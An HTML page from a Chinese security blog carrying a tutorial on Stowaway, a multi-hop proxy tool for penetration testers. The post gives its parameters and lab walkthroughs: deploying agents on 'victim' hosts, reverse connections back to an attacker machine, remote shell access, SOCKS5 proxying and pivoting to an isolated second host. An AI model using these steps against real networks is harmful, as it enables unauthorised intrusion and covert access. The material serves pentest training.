@@ -1,0 +1,657 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <head>
+        <meta charset="utf-8" />
+        <title>Stowaway工具 | 小C♥天天</title>
+        <meta name="author" content="小C&天天" />
+        <meta name="description" content="^v^" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+        <link rel="icon" href="/images/icon.jpg" />
+        <script src="/js/vue/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.0/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<!-- 兼容不同版本的浏览器 -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<!-- 高亮代码 -->
+<script src="https://static-argvchs.netlify.app/libs/highlight.js/11.8.0/highlight.min.js"></script>
+<script src="https://static-argvchs.netlify.app/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link rel="stylesheet" href="https://static-argvchs.netlify.app/libs/highlight.js/11.8.0/styles/base16-onedark.min.css" />
+<script src="/js/lib/highlight.js"></script>
+
+
+<!-- 使用 KaTeX 渲染数学公式 -->
+<script src="https://static-argvchs.netlify.app/libs/KaTeX/0.16.8/katex.min.js"></script>
+<script src="https://static-argvchs.netlify.app/libs/KaTeX/0.16.8/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://static-argvchs.netlify.app/libs/KaTeX/0.16.8/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<!-- 简单的点击图片放大缩小的预览 -->
+<script src="/js/lib/preview.js"></script>
+
+
+<!-- 看板娘 -->
+<script src="https://cdn.staticfile.org/pixi.js/4.6.1/pixi.min.js"></script>
+
+
+
+<!-- 评论设置 -->
+
+<script
+    src="https://giscus.app/client.js"
+    data-repo="A7cc/giscus-comments"
+    data-repo-id="R_kgDOKKSvfw"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOKKSvf84CYyp2"
+    data-mapping="pathname"
+    data-strict="1"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="https://static-argvchs.netlify.app/css/giscus.css"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+<script src="https://static-argvchs.netlify.app/libs/animejs/3.2.1/anime.min.js"></script>
+<link rel="stylesheet" href="/css/main.css" />
+
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="layout">
+            <!-- 页面加载 -->
+            <transition name="fade">
+                <div id="loading" v-show="loading">
+                    <div id="loading-circle">
+                        <h2>LOADING</h2>
+                        <p>正在加载</p>
+                        <img src="/images/afde9fa65a5742a90b51d6e1211e841e.gif" />
+                    </div>
+                </div>
+            </transition>
+            <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>小C♥天天</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;文章</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+        <a href="/tools">
+            <i class="fa-solid fa-tools fa-fw"></i>
+            <span>&ensp;工具</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;小C♥天天</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">文章</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                    </div>
+                </a>
+                
+                <a href="/tools">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tools fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">工具</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+            <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+                <div id="article-posts-wrap" true ref="homePostsWrap">
+    <div class="article">
+        <div>
+            <h1>Stowaway工具</h1>
+        </div>
+        <div class="info">
+            <span class="date">
+                <span class="icon">
+                    <i class="fa-solid fa-calendar fa-fw"></i>
+                </span>
+                2023/10/8
+            </span>
+            
+            <span class="category">
+                <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
+                    <span class="icon">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </span>
+                    工具使用
+                </a>
+            </span>
+            
+            
+            <span class="tags">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                
+                
+                <span class="tag">
+                    
+                    <a href="/tags/%E4%BB%A3%E7%90%86%E4%B8%8E%E8%BD%AC%E5%8F%91/" style="color: #03a9f4">代理与转发</a>
+                </span>
+                
+            </span>
+            
+        </div>
+        
+        <div class="content" v-pre>
+            <h1 id="壹-工具说明"><a href="#壹-工具说明" class="headerlink" title="壹 工具说明"></a>壹 工具说明</h1><p><code>Stowaway</code>是一个利用<code>go</code>语言编写、专为渗透测试工作者制作的多级代理工具，用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能，算是<code>Venom</code>升级吧！（百度的，没用过<code>Venom</code>），不过挺喜欢他的节点管理和多层代理概念的，像<code>nps</code>、<code>frp</code>、<code>iox</code>就不能做多层代理；<code>nps</code>比较大，<code>10MB</code>左右；<code>frp</code>配置多，<code>iox</code>没用过，后面用了再说，<code>Stowaway</code>使用自定义协议和加密算法，提供更加安全和隐秘的通信方式。</p>
+<span id="more"></span>
+
+<ul>
+<li><p>角色</p>
+<ul>
+<li><code>Stowaway</code>一共包含两种角色，分别是：</li>
+<li><code>admin</code> 渗透测试者使用的主控端，也就是管理<code>agent</code>端，类似与<code>cobaltstrike</code>的<code>teamserver</code>。</li>
+<li><code>agent</code> 渗透测试者部署的被控端，也就是小弟，类似与<code>cobaltstrike</code>的弱鸡。</li>
+</ul>
+</li>
+<li><p>名词定义</p>
+<ul>
+<li>节点：就两个<code>admin</code>和<code>agent</code></li>
+<li>主动模式：指当前操作的节点主动连接另一个节点，也就正向连接</li>
+<li>被动模式：指当前操作的节点监听某个端口，等待另一个节点连接，即反向连接</li>
+<li>上游：因为<code>Stowaway</code>的节点连接是一种类似与树型分布的，即上游指当前操作的节点与其父节点之间的流量</li>
+<li>下游：指当前操作的节点与其<strong>所有</strong>子节点之间的流量</li>
+</ul>
+</li>
+<li><p>特点：</p>
+<ul>
+<li>管理端更加友好的交互,支持命令补全&#x2F;历史</li>
+<li>一目了然的节点树管理</li>
+<li>丰富的节点信息展示</li>
+<li>节点间正向&#x2F;反向连接</li>
+<li>节点间支持重连</li>
+<li>节点间可通过socks5代理进行连接</li>
+<li>节点间可通过ssh隧道连接</li>
+<li>节点间流量可选择TCP&#x2F;HTTP</li>
+<li>多级socks5流量代理转发，支持UDP&#x2F;TCP,IPV4&#x2F;IPV6</li>
+<li>节点支持ssh访问远程主机</li>
+<li>远程shell</li>
+<li>上传及下载文件</li>
+<li>端口本地&#x2F;远程映射</li>
+<li>节点可端口复用</li>
+<li>自由开关各类服务</li>
+<li>节点间相互认证</li>
+<li>节点间流量以AES-256-GCM进行加密</li>
+<li>相较于v1.0，文件体积减小25%</li>
+<li>支持各类平台（Linux&#x2F;Mac&#x2F;Windows&#x2F;MIPS&#x2F;ARM）</li>
+</ul>
+</li>
+<li><p>缺点：</p>
+<ul>
+<li>暂不不支持免杀</li>
+<li>结构及代码结构不够严谨，功能可能存在bug</li>
+<li>admin不在线时，新节点将不允许加入</li>
+<li>admin仅支持一个直接连接的agent节点，agent节点则无此限制，一般再自己机器上搭建第一个agent节点</li>
+<li>如果用户使用windows下的admin端，请先下载<a target="_blank" rel="noopener" href="https://github.com/adoxa/ansicon/releases">ansicon</a>，或者在<a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway/blob/master">这里</a>下载，之后进入对应系统位数的文件夹，执行<code>ansicon.exe -i</code>即可，不然admin端会出现乱码的问题</li>
+</ul>
+</li>
+</ul>
+<h1 id="贰-工具适用场景"><a href="#贰-工具适用场景" class="headerlink" title="贰 工具适用场景"></a>贰 工具适用场景</h1><p>代理工具就是代理啊！</p>
+<h1 id="叁-安装说明"><a href="#叁-安装说明" class="headerlink" title="叁 安装说明"></a>叁 安装说明</h1><p>官方地址：<a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway">Stowaway</a></p>
+<p>源码：<a href="/tools/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway-master.zip">Stowaway-master.zip</a>，不想编译的盆油可以直接用<a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway/releases">release</a>下编译完成的程序。</p>
+<h1 id="肆-工具参数说明"><a href="#肆-工具参数说明" class="headerlink" title="肆 工具参数说明"></a>肆 工具参数说明</h1><ul>
+<li>admin</li>
+</ul>
+<pre><code>参数:
+-l 被动模式下的监听地址[ip]:&lt;port&gt;
+-c 主动模式下的目标节点地址
+-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致
+--proxy socks5代理服务器地址
+--proxyu socks5代理服务器用户名(可选)
+--proxyp socks5代理服务器密码(可选)
+--down 下游协议类型,默认为裸TCP流量,可选HTTP
+</code></pre>
+<ul>
+<li>agent</li>
+</ul>
+<pre><code>参数:
+-l 被动模式下的监听地址[ip]:&lt;port&gt;
+-c 主动模式下的目标节点地址
+-s 节点通信加密密钥
+--proxy socks5代理服务器地址
+--proxyu socks5代理服务器用户名(可选)
+--proxyp socks5代理服务器密码(可选)
+--reconnect 重连时间间隔
+--rehost 端口复用时复用的IP地址
+--report 端口复用时复用的端口号
+--up 上游协议类型,默认为裸TCP流量,可选HTTP
+--down 下游协议类型,默认为裸TCP流量,可选HTTP
+--cs 运行平台的shell编码类型，默认为utf-8，可选gbk
+</code></pre>
+<h1 id="伍-工具使用"><a href="#伍-工具使用" class="headerlink" title="伍 工具使用"></a>伍 工具使用</h1><h2 id="5-1-主动和连接被动连接"><a href="#5-1-主动和连接被动连接" class="headerlink" title="5.1 主动和连接被动连接"></a>5.1 主动和连接被动连接</h2><p><code>-l</code>和<code>-c</code>在<code>admin</code>&amp;&amp;<code>agent</code>用法一致，分别是主动模式(<code>-l</code>)、被动模式(<code>-c</code>)，两个参数都需要<code>IP:port</code>，但是<code>-l</code>是监听，若不指定IP地址，则默认监听在<code>0.0.0.0</code>上，而<code>-c</code>的<code>IP:port</code>是希望连接到的节点<code>IP:port</code>，个人的建议是使用<code>admin</code>端为主动模式，<code>agent</code>端为被动模式，第一个<code>agent</code>端放在vps或者自己的pc上，因为这样稳定，而且可以用代理，如果<code>admin</code>端掉线了，<code>agent</code>端不会掉线，但是<code>admin</code>端使用被动模式，<code>agent</code>端掉线，<code>admin</code>端也会掉线。</p>
+<ul>
+<li>使用：<ul>
+<li><code>-l</code><ul>
+<li>admin：<code>./stowaway_admin -l 9999</code> or <code>./stowaway_admin -l 127.0.0.1:9999</code></li>
+<li>agent：<code>./stowaway_agent -l 9999</code> or <code>./stowaway_agent -l 127.0.0.1:9999</code></li>
+</ul>
+</li>
+<li><code>-c</code><ul>
+<li>admin：<code>./stowaway_admin -c 希望连接到的节点IP:9999</code></li>
+<li>agent：<code>./stowaway_agent -c 希望连接到的节点IP:9999</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="5-2-加密"><a href="#5-2-加密" class="headerlink" title="5.2 加密"></a>5.2 加密</h2><p><code>-s</code>这个参数在<code>admin</code>&amp;&amp;<code>agent</code>用法一致，均可用在主动&amp;&amp;被动模式下，为可选选项，若为空，则代表通信不被加密，反之则通信基于用户所给出的密钥加密，<font color="red">需要注意的是密码需要全部结点一致才能连接</font>。</p>
+<ul>
+<li>使用：<ul>
+<li><code>-s</code><ul>
+<li>admin：<code>./stowaway_admin -l 9999 -s 123</code> or <code>./stowaway_admin -c 希望连接到的节点:9999 -s 123</code></li>
+<li>agent：<code>./stowaway_agent -l 9999 -s 123</code> or <code>./stowaway_agent -c 希望连接到的节点:9999 -s 123</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="5-3-socks5代理"><a href="#5-3-socks5代理" class="headerlink" title="5.3 socks5代理"></a>5.3 socks5代理</h2><p><code>--proxy/--proxyu/--proxyp</code>这三个参数在<code>admin</code>&amp;&amp;<code>agent</code>用法一致，仅用在<font color="red">主动模式</font>下，参数详细介绍看参数解析。</p>
+<ul>
+<li>使用：<ul>
+<li><p>无用户名密码：</p>
+<ul>
+<li>admin: <code>./stowaway_admin -c 希望连接到的节点:9999 --proxy xxx.xxx.xxx.xxx</code></li>
+<li>agent: <code>./stowaway_agent -c 希望连接到的节点:9999 --proxy xxx.xxx.xxx.xxx</code></li>
+</ul>
+</li>
+<li><p>有用户名密码：</p>
+<ul>
+<li>admin: <code>./stowaway_admin -c 希望连接到的节点:9999 --proxy xxx.xxx.xxx.xxx --proxyu 用户名 --proxyp 密码</code></li>
+<li>agent: <code>./stowaway_agent -c 希望连接到的节点:9999 --proxy xxx.xxx.xxx.xxx --proxyu 用户名 --proxyp 密码</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>如果我们进入了内网机器需要设置<code>socks5</code>代理，只需要在<code>admin</code>端处进入需要代理的内网机器处设置<code>socks &lt;lport&gt; [username] [pass]</code>即可代理成功。</p>
+<h2 id="5-4-多层代理"><a href="#5-4-多层代理" class="headerlink" title="5.4 多层代理"></a>5.4 多层代理</h2><p>当我们进入了内网机器后，需要进行多层代理时，同样分为主动模式和被动模式，在连接时，<code>agent</code>端的设置与前面的主被动连接一样：</p>
+<ul>
+<li>使用：<ul>
+<li><code>-l</code><ul>
+<li>agent：<code>./stowaway_agent -l 9999</code> or <code>./stowaway_agent -l 127.0.0.1:9999</code></li>
+</ul>
+</li>
+<li><code>-c</code><ul>
+<li>agent：<code>./stowaway_agent -c 希望连接到的节点IP:9999</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>但是<code>admin</code>端则不同，需要进入对应的内网机器A（注意该内网机器A能连接的我们想要连接的另一台内网机器B）：</p>
+<ul>
+<li>使用：<ul>
+<li>启动被动连接：<code>listen</code></li>
+<li>启动主动连接：<code>connect ip:port</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="陆-工具使用"><a href="#陆-工具使用" class="headerlink" title="陆 工具使用"></a>陆 工具使用</h1><h2 id="6-1-正向连接（admin端主动模式）"><a href="#6-1-正向连接（admin端主动模式）" class="headerlink" title="6.1 正向连接（admin端主动模式）"></a>6.1 正向连接（admin端主动模式）</h2><p>假设我们需要攻击机正向连接受害机1：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/893c9018901ae37a6989727ca31c434b.png" alt="893c9018901ae37a6989727ca31c434b.png"><br>在受害机1处（<code>agent</code>客户端）设置监听：</p>
+<pre><code class="bash">./linux_x64_agent -l 9999 -s 123456
+</code></pre>
+<p><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/5e269979a282d4b8bcae76275061986e.png" alt="5e269979a282d4b8bcae76275061986e.png"><br>在攻击机处（<code>admin</code>服务端）主动连接受害机1：</p>
+<pre><code class="bash">.\windows_x64_admin.exe -c 192.168.142.130:9999 -s 123456
+</code></pre>
+<p><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/fc834e1035eda5a14160021545487610.png" alt="fc834e1035eda5a14160021545487610.png"><br>如果<code>admin</code>服务端出现<code>Connection from node IP:port is set up successfully! Node id is 0</code>说明连成功。一般我们通过<code>topo</code>查看拓扑图，通过<code>use</code>使用结点，通过<code>shell</code>进入客户端的机器。</p>
+<h2 id="6-2-反向连接（admin端被动模式）"><a href="#6-2-反向连接（admin端被动模式）" class="headerlink" title="6.2 反向连接（admin端被动模式）"></a>6.2 反向连接（admin端被动模式）</h2><p>假设我们需要攻击机反向连接受害机1：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/893c9018901ae37a6989727ca31c434b.png" alt="893c9018901ae37a6989727ca31c434b.png"><br>在攻击机处（<code>admin</code>服务端）设置监听：</p>
+<pre><code class="bash">.\windows_x64_admin.exe -l 9999 -s 123456
+</code></pre>
+<p><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/dde0d3bb65b4c6a4cfa569c09d608ece.png" alt="dde0d3bb65b4c6a4cfa569c09d608ece.png"><br>在受害机1处（<code>agent</code>客户端）主动连接攻击机：</p>
+<pre><code class="bash">./linux_x64_agent -c 192.168.142.128:9999 -s 123456
+</code></pre>
+<p><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/ad06967a934b9287125df72989148b99.png" alt="ad06967a934b9287125df72989148b99.png"><br>再看看攻击机处的状态：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/0f769a5f94a1e7bda5dcfbe63070362d.png" alt="0f769a5f94a1e7bda5dcfbe63070362d.png"></p>
+<h2 id="6-3-设置socket代理"><a href="#6-3-设置socket代理" class="headerlink" title="6.3 设置socket代理"></a>6.3 设置socket代理</h2><p>假设我们已经通过攻击机连接到了受害机1中（无论主动模式还是被动模式）：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/521aa263d5cd1fcd88c7d6ff7c56c03b.png" alt="521aa263d5cd1fcd88c7d6ff7c56c03b.png"><br>通过攻击机处进入受害机1结点：</p>
+<pre><code class="bash">use 0
+socks 1080
+</code></pre>
+<p><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/30bd1d7bc3476efb446d79cd081ae79d.png" alt="30bd1d7bc3476efb446d79cd081ae79d.png"><br>设置浏览器代理，并访问受害机1机器：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/848b64eeb9789e7cf4277f91a58abf65.png" alt="848b64eeb9789e7cf4277f91a58abf65.png"></p>
+<h2 id="6-4-设置多层代理"><a href="#6-4-设置多层代理" class="headerlink" title="6.4 设置多层代理"></a>6.4 设置多层代理</h2><ul>
+<li>受害机2能与受害机1互相访问</li>
+</ul>
+<p>这里有个场景：攻击机可以与受害机1交互，不能访问受害机2，受害机2不出网，但可以访问受害机1：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/893c9018901ae37a6989727ca31c434b.png" alt="893c9018901ae37a6989727ca31c434b.png"><br>假设我们已经通过攻击机连接到了受害机1中（无论主动模式还是被动模式）：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/521aa263d5cd1fcd88c7d6ff7c56c03b.png" alt="521aa263d5cd1fcd88c7d6ff7c56c03b.png"><br>通过攻击机处进入受害机1结点：</p>
+<pre><code class="bash">use 0
+listen
+选择选项1.Normal Passive
+输入一个受害机1中未被占用的端口
+</code></pre>
+<p><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/2e5dc3886bbf6e498caa94051338e0ab.png" alt="2e5dc3886bbf6e498caa94051338e0ab.png"><br>在受害机2处（<code>agent</code>客户端）主动连接受害机1监听的端口：</p>
+<pre><code class="bash">./linux_x64_agent -c 192.168.136.129:60001 -s 123456
+</code></pre>
+<p><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/4cc7b63a075d24545768f0afd74e506e.png" alt="4cc7b63a075d24545768f0afd74e506e.png"><br>再看看攻击机处的状态，增加另一个<code>node1</code>结点：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/c1d58f91df46ae0e09ef950f6e6bc823.png" alt="c1d58f91df46ae0e09ef950f6e6bc823.png"><br>进入<code>node1</code>结点查看信息为受害机2：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/221a3acf9695c5e4502ef12fc4f227b3.png" alt="221a3acf9695c5e4502ef12fc4f227b3.png"></p>
+<ul>
+<li>受害机2不能访问受害机1</li>
+</ul>
+<p>这里有个场景：攻击机可以与受害机1交互，不能访问受害机2，受害机2不出网，也不能访问受害机1，但是受害机1可以访问受害机2：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/893c9018901ae37a6989727ca31c434b.png" alt="893c9018901ae37a6989727ca31c434b.png"><br>假设我们已经通过攻击机连接到了受害机1中（无论主动模式还是被动模式）：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/521aa263d5cd1fcd88c7d6ff7c56c03b.png" alt="521aa263d5cd1fcd88c7d6ff7c56c03b.png"><br>通过受害机2设置监听：</p>
+<pre><code class="bash">./linux_x64_agent -l 60001 -s 123456
+</code></pre>
+<p><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/fef190b1973320c85b932644801b6cd0.png" alt="fef190b1973320c85b932644801b6cd0.png"><br>通过攻击机处进入受害机1结点：</p>
+<pre><code class="bash">use 0
+connect 192.168.136.128:60001
+</code></pre>
+<p><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/f9c2d56e1b3df610d049cbcca20ceffc.png" alt="f9c2d56e1b3df610d049cbcca20ceffc.png"><br>多出一个结点2，并进入结点2，确认为受害机2：<br><img src="/images/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Stowaway%E5%B7%A5%E5%85%B7/0e2239d727e1dc85fb6fa7a87242f686.png" alt="0e2239d727e1dc85fb6fa7a87242f686.png"></p>
+<h1 id="柒-参考"><a href="#柒-参考" class="headerlink" title="柒 参考"></a>柒 参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway">Stowaway</a></li>
+</ul>
+
+        </div>
+        
+        
+        <div id="comment">
+            <div id="giscus-container" class="giscus"></div>
+        </div>
+        
+    </div>
+    
+    <div id="article-card">
+        <div id="card-style">
+    <div id="card-div" class="card-cls">
+        <div class="avatar">
+            <img src="/images/f6e2b991f74bfd7b88c3ab1a3d513b94.jpg" alt="avatar" />
+        </div>
+        <div class="name">小C&amp;天天</div>
+        <div class="description">
+            <p>修学储能 先博后渊</p>
+
+        </div>
+        
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/A7cc">
+                    <i class="fa-brands fa-github fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.qq.com/">
+                    <i class="fa-brands fa-qq fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.weibo.com/">
+                    <i class="fa-brands fa-weibo fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://google.com/">
+                    <i class="fa-brands fa-google fa-fw"></i>
+                </a>
+            </span>
+            
+        </div>
+        
+        
+        <div class="friend-links">
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="http://www.wgs6km.top/">kyrieee</a>
+            </span>
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="https://tonyd0g.gitee.io/">tonyd0g</a>
+            </span>
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="https://ruyueattention.github.io/">ruyueattention</a>
+            </span>
+            
+        </div>
+        
+    </div>
+    
+    <!-- <br /> -->
+    <!-- 目录 -->
+    <!-- 
+    <div id="card-div">
+        <div id="toc" class="toc-article">
+            <strong class="toc-title">文章目录</strong>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A3%B9-%E5%B7%A5%E5%85%B7%E8%AF%B4%E6%98%8E"><span class="toc-text">壹 工具说明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B4%B0-%E5%B7%A5%E5%85%B7%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">贰 工具适用场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%81-%E5%AE%89%E8%A3%85%E8%AF%B4%E6%98%8E"><span class="toc-text">叁 安装说明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%82%86-%E5%B7%A5%E5%85%B7%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="toc-text">肆 工具参数说明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%8D-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">伍 工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E4%B8%BB%E5%8A%A8%E5%92%8C%E8%BF%9E%E6%8E%A5%E8%A2%AB%E5%8A%A8%E8%BF%9E%E6%8E%A5"><span class="toc-text">5.1 主动和连接被动连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-%E5%8A%A0%E5%AF%86"><span class="toc-text">5.2 加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-socks5%E4%BB%A3%E7%90%86"><span class="toc-text">5.3 socks5代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4-%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86"><span class="toc-text">5.4 多层代理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%86-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">陆 工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%EF%BC%88admin%E7%AB%AF%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F%EF%BC%89"><span class="toc-text">6.1 正向连接（admin端主动模式）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-2-%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%EF%BC%88admin%E7%AB%AF%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%EF%BC%89"><span class="toc-text">6.2 反向连接（admin端被动模式）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-3-%E8%AE%BE%E7%BD%AEsocket%E4%BB%A3%E7%90%86"><span class="toc-text">6.3 设置socket代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-4-%E8%AE%BE%E7%BD%AE%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86"><span class="toc-text">6.4 